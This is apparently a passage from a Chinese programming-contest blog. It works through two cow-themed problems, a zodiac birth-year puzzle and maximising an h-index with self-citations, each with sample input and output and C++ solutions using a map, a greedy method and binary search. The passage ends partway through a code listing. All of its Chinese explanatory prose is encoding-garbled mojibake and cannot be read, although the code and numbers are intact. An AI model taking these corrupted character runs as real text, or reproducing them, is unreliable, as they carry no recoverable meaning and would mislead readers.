çš„å‡ºç”Ÿå¹´ä»½ä¹‹é—´ç›¸å·®çš„å¹´æ•°ã€‚è¾“å…¥ä¿è¯å¯ä»¥é€šè¿‡ç»™å®šçš„ä¿¡æ¯æ±‚å‡ºç»“æœã€‚</p><h4 id="æ•°æ®èŒƒå›´-2"><a href="#æ•°æ®èŒƒå›´-2" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1â‰¤Nâ‰¤100$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-2"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4Mildred born in previous Dragon year from BessieGretta born in previous Monkey year from MildredElsie born in next Ox year from GrettaPaulina born in next Dog year from Bessie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-2"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-1"><a href="#æ ·ä¾‹è§£é‡Š-1" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨ä»¥ä¸Šçš„è¾“å…¥ä¸­ï¼Œ</p><ul><li>$Elsie$ åœ¨ $Bessie$ ä¹‹å‰ $12$ å¹´å‡ºç”Ÿã€‚</li><li>$Mildred$ åœ¨ $Bessie$ ä¹‹å‰ $9$ å¹´å‡ºç”Ÿã€‚</li><li>$Gretta$ åœ¨ $Bessie$ ä¹‹å‰ $17$ å¹´å‡ºç”Ÿã€‚</li><li>$Paulina$ åœ¨ $Bessie$ ä¹‹å $9$ å¹´å‡ºç”Ÿã€‚</li></ul><h4 id="é¢˜è§£ï¼š-2"><a href="#é¢˜è§£ï¼š-2" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ç”¨mapæ¨¡æ‹Ÿï¼ˆç±»ä¼¼ä¸€ä¸ªå­—å…¸ï¼‰ç”¨unordered_mapä¸ç”¨æ’åºå¯èƒ½ä¼šæ›´å¿«ï¼Œè®°å½•æ¯å¤´ç‰›ç›¸å·®$Bessie$çš„å¹´é¾„ï¼ŒæŠŠ$Bessie$è®¾ç½®ä¸ºå…ƒå¹´ï¼ˆ$0$å¹´ï¼‰ã€‚æ¨¡æ‹Ÿé¢˜å°±æ˜¯æ³¨æ„é¢é¢ä¿±åˆ°ã€‚</p><p><strong>C++å¯¹äºè´Ÿæ•°å–ä½™è¿˜æ˜¯è´Ÿæ•°ï¼Œæ‰€ä»¥ä½™æ•°è¦åŠ ä¸Šä¸€ä¸ªé™¤æ•°å†æ¨¡ï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ€å·§ï¼š</strong><code>int r = ((x - y) % 12 + 12) % 12;</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unordered_map&gt;</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cmath&gt;</span></span>using namespace std<span class="token punctuation">;</span>unordered_map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&gt;</span> id<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token string">"Ox"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Tiger"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Rabbit"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token string">"Dragon"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Snake"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Horse"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">,</span>     <span class="token punctuation">{</span><span class="token string">"Goat"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Monkey"</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Rooster"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">}</span><span class="token punctuation">,</span>     <span class="token punctuation">{</span><span class="token string">"Dog"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Pig"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Rat"</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>unordered_map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&gt;</span> p<span class="token punctuation">;</span>p<span class="token punctuation">[</span><span class="token string">"Bessie"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>string s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"previous"</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> x <span class="token operator">=</span> p<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>y <span class="token operator">=</span> id<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">-</span> y<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>r<span class="token punctuation">)</span> r <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>p<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> x <span class="token operator">-</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">int</span> x <span class="token operator">=</span> p<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>y <span class="token operator">=</span> id<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token operator">-</span>x<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>r<span class="token punctuation">)</span> r <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>p<span class="token punctuation">[</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> x <span class="token operator">+</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>cout<span class="token operator">&lt;&lt;</span><span class="token function">abs</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token string">"Elsie"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç‰›çš„å­¦æœ¯åœˆ-I"><a href="#ç‰›çš„å­¦æœ¯åœˆ-I" class="headerlink" title="ç‰›çš„å­¦æœ¯åœˆ I"></a>ç‰›çš„å­¦æœ¯åœˆ I</h2><p>ç”±äºå¯¹è®¡ç®—æœºç§‘å­¦çš„çƒ­çˆ±ï¼Œä»¥åŠæœ‰æœä¸€æ—¥æˆä¸º ã€Œ$Bessie$ åšå£«ã€çš„è¯±æƒ‘ï¼Œå¥¶ç‰› $Bessie$ å¼€å§‹æ”»è¯»è®¡ç®—æœºç§‘å­¦åšå£«å­¦ä½ã€‚</p><p>ç»è¿‡ä¸€æ®µæ—¶é—´çš„å­¦æœ¯ç ”ç©¶ï¼Œå¥¹å·²ç»å‘è¡¨äº† $N $ç¯‡è®ºæ–‡ï¼Œå¹¶ä¸”å¥¹çš„ç¬¬$ i $ç¯‡è®ºæ–‡å¾—åˆ°äº†æ¥è‡ªå…¶ä»–ç ”ç©¶æ–‡çŒ®çš„ $ci $æ¬¡å¼•ç”¨ã€‚</p><p>$Bessie$ å¬è¯´å­¦æœ¯æˆå°±å¯ä»¥ç”¨ $h $æŒ‡æ•°æ¥è¡¡é‡ã€‚</p><p>$h$ æŒ‡æ•°ç­‰äºä½¿å¾—ç ”ç©¶å‘˜æœ‰è‡³å°‘ $h$ ç¯‡å¼•ç”¨æ¬¡æ•°ä¸å°‘äº $h$ çš„è®ºæ–‡çš„æœ€å¤§æ•´æ•° $h$ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœä¸€åç ”ç©¶å‘˜æœ‰ $4$ç¯‡è®ºæ–‡ï¼Œå¼•ç”¨æ¬¡æ•°åˆ†åˆ«ä¸º$ (1,100,2,3)$ï¼Œåˆ™$ h$ æŒ‡æ•°ä¸º$ 2$ï¼Œç„¶è€Œè‹¥å¼•ç”¨æ¬¡æ•°ä¸º $(1,100,3,3)$ åˆ™ $h$ æŒ‡æ•°å°†ä¼šæ˜¯$ 3$ã€‚</p><p>ä¸ºäº†æå‡å¥¹çš„ $h$æŒ‡æ•°ï¼Œ$Bessie$ è®¡åˆ’å†™ä¸€ç¯‡ç»¼è¿°ï¼Œå¹¶å¼•ç”¨ä¸€äº›å¥¹æ›¾ç»å†™è¿‡çš„è®ºæ–‡ã€‚</p><p>ç”±äºé¡µæ•°é™åˆ¶ï¼Œå¥¹è‡³å¤šå¯ä»¥åœ¨è¿™ç¯‡ç»¼è¿°ä¸­å¼•ç”¨ $L$ ç¯‡è®ºæ–‡ï¼Œå¹¶ä¸”<strong>å¥¹åªèƒ½å¼•ç”¨æ¯ç¯‡å¥¹çš„è®ºæ–‡è‡³å¤šä¸€æ¬¡</strong>ã€‚</p><p>è¯·å¸®åŠ© $Bessie$ æ±‚å‡ºåœ¨å†™å®Œè¿™ç¯‡ç»¼è¿°åå¥¹å¯ä»¥è¾¾åˆ°çš„æœ€å¤§$ h$ æŒ‡æ•°ã€‚</p><p>æ³¨æ„$ Bessie$ çš„å¯¼å¸ˆå¯èƒ½ä¼šå‘ŠçŸ¥å¥¹çº¯ç²¹ä¸ºäº†æå‡$h$ æŒ‡æ•°è€Œå†™ç»¼è¿°å­˜åœ¨è¿åå­¦æœ¯é“å¾·çš„å«Œç–‘ï¼›æˆ‘ä»¬ä¸å»ºè®®å…¶ä»–å­¦è€…æ¨¡ä»¿ $Bessie$ çš„è¡Œä¸ºã€‚</p><h4 id="è¾“å…¥æ ¼å¼-3"><a href="#è¾“å…¥æ ¼å¼-3" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«$ N$ å’Œ $L$ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« $N $ä¸ªç©ºæ ¼åˆ†éš”çš„æ•´æ•° $c1,â€¦,cN$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-3"><a href="#è¾“å‡ºæ ¼å¼-3" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºå†™å®Œç»¼è¿°å $Bessie$ å¯ä»¥è¾¾åˆ°çš„æœ€å¤§ $h$ æŒ‡æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´-3"><a href="#æ•°æ®èŒƒå›´-3" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1â‰¤Nâ‰¤10^5$,<br>$0â‰¤ciâ‰¤10^5$,<br>$0â‰¤Lâ‰¤10^5$</p><h4 id="è¾“å…¥æ ·ä¾‹1ï¼š"><a href="#è¾“å…¥æ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹1ï¼š"></a>è¾“å…¥æ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4 01 100 2 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹1ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹1ï¼š"></a>è¾“å‡ºæ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹1è§£é‡Š"><a href="#æ ·ä¾‹1è§£é‡Š" class="headerlink" title="æ ·ä¾‹1è§£é‡Š"></a>æ ·ä¾‹1è§£é‡Š</h4><p>$Bessie$ ä¸èƒ½å¼•ç”¨ä»»ä½•å¥¹æ›¾ç»å†™è¿‡çš„è®ºæ–‡ã€‚ä¸Šæ–‡ä¸­æåˆ°ï¼Œ$(1,100,2,3)$ çš„ $h$ æŒ‡æ•°ä¸º $2$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹2ï¼š"><a href="#è¾“å…¥æ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹2ï¼š"></a>è¾“å…¥æ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4 11 100 2 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹2ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹2ï¼š"></a>è¾“å‡ºæ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœ $Bessie$ å¼•ç”¨å¥¹çš„ç¬¬ä¸‰ç¯‡è®ºæ–‡ï¼Œå¼•ç”¨æ•°ä¼šå˜ä¸º $(1,100,3,3)$ã€‚ä¸Šæ–‡ä¸­æåˆ°ï¼Œè¿™ä¸€å¼•ç”¨æ•°çš„$ h$ æŒ‡æ•°ä¸º $3$ã€‚</p><h4 id="é¢˜è§£ï¼š-3"><a href="#é¢˜è§£ï¼š-3" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ç•¥å¾®æœ‰ç‚¹éš¾åº¦ï¼Œä¸å†æ˜¯ç®€å•çš„æ¨¡æ‹Ÿï¼Œæ˜¯çµèƒ½ä¼ è¾“çš„å¼±åŒ–ç‰ˆã€‚</p><p>å°†æ–‡ç« ä»å¤§åˆ°å°æ’åºï¼Œç„¶åä»å°åˆ°å¤§æšä¸¾$h$ï¼Œè¿™ä¸ª$h$è¦æˆç«‹è¦æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š</p><ul><li>ç”±äºæˆ‘ä»¬é€‰æ‹©çš„æ˜¯å‰$h$ç¯‡æ–‡ç« ï¼Œè¿™$h$ç¯‡æ–‡ç« æ˜¯æ‰€æœ‰æ–‡ç« é‡Œæœ€å¤§çš„$h$ç¯‡ï¼Œå› æ­¤è¿™hç¯‡ä¸­çš„æœ€å°å€¼è¦å¤§äºç­‰äº$hâˆ’1$ã€‚</li><li>è¿™$h$ç¯‡æ–‡ç« ä¸­ï¼Œå¼•ç”¨æ¬¡æ•°ä¸º$hâˆ’1$çš„æ–‡ç« æ•°é‡åº”è¯¥å°äºç­‰äº$L$ã€‚</li></ul><p><strong>æ–¹æ³•ä¸€ï¼šè´ªå¿ƒ</strong></p><p>é€‰æ‹©éƒ¨åˆ†æ•°ï¼Œç„¶åè®©ä»–ä»¬åŠ $1$åä½¿å¾—$a[h+1]=h+1$,é¦–å…ˆå°±æ˜¯è¦é€‰æ‹©$a[h+1]$è¿™ä¸ªç‚¹ï¼Œåœ¨è¿™é‡Œè¿›è¡Œåˆ¤æ–­<br>ï¼Œå¦‚æœ$a[h+1]&lt;h$çš„è¯ï¼Œå°±ä¸å¯èƒ½å˜æˆ$h+1$äº†(å› ä¸ºä¸€ä¸ªæ•°æœ€å¤šåŠ $1$)ï¼Œæ‰€ä»¥æœ€å¤§æŒ‡æ•°å°±æ˜¯$h$,å¦‚æœ$a[h+1]=h$çš„è¯ï¼Œè¦æ‰¾é€†åºæ’<br>åˆ—ä¸­åœ¨$1$~$h+1$ï¼Œè¿™ä¸ªèŒƒå›´ä¸­æœ‰å¤šå°‘ä¸ªç‚¹ç­‰äº$h$($cnt$ä¸ª)ï¼Œè¿™äº›ç‚¹éƒ½éœ€è¦åŠ $1$ï¼Œå› ä¸ºè¿™äº›ç‚¹éƒ½éœ€è¦å¤§äºç­‰äº$h+1$,æ‰€ä»¥ï¼Œè‡³å°‘éœ€è¦<br>$cnt$ä¸ªç‚¹ï¼Œå½“$cnt&lt;=L$çš„æ—¶å€™æ»¡è¶³æ¡ä»¶ï¼ŒæŒ‡æ•°æ˜¯$h+1$,å¦åˆ™æ˜¯$h$ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;algorithm&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cmath&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>bool <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> x <span class="token operator">&gt;</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>l<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>l<span class="token punctuation">;</span><span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token operator">+</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;=</span>i<span class="token punctuation">)</span> h <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>h<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>h<span class="token punctuation">)</span> <span class="token punctuation">{</span>cout<span class="token operator">&lt;&lt;</span>h<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>h<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>h<span class="token punctuation">)</span> cnt<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">&gt;=</span>cnt<span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span>h<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">else</span> cout<span class="token operator">&lt;&lt;</span>h<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ–¹æ³•äºŒï¼šäºŒåˆ†</strong></p><p>å› ä¸ºæ’å®Œåºåï¼Œæœ‰å•è°ƒæ€§ï¼Œå¯ä»¥äºŒåˆ†ã€‚åªæœ‰$h$æˆç«‹æ—¶ï¼Œ$0$~$h$éƒ½æˆç«‹ï¼Œ$h$+$1$~$n$ä¸æˆç«‹</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>l<span class="token punctuation">;</span>bool <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token operator">&gt;</span>b<span class="token punctuation">;</span><span class="token punctuation">}</span>bool <span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//sumæ˜¯æ»¡è¶³æ¡ä»¶çš„çš„æ¬¡æ•°,cntæ˜¯+1çš„æ¬¡æ•°</span>    <span class="token keyword">int</span> sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>cnt<span class="token operator">=</span>l<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>x<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;=</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> sum<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;=</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> cnt<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sum<span class="token operator">==</span>x<span class="token operator">&amp;&amp;</span>cnt<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>l<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token operator">+</span>n<span class="token punctuation">,</span>cmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> l<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>r<span class="token operator">=</span>n<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> l<span class="token operator">+</span>r<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>            l<span class="token operator">=</span>mid<span class="token punctuation">;</span>        <span class="token keyword">else</span> r<span class="token operator">=</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> 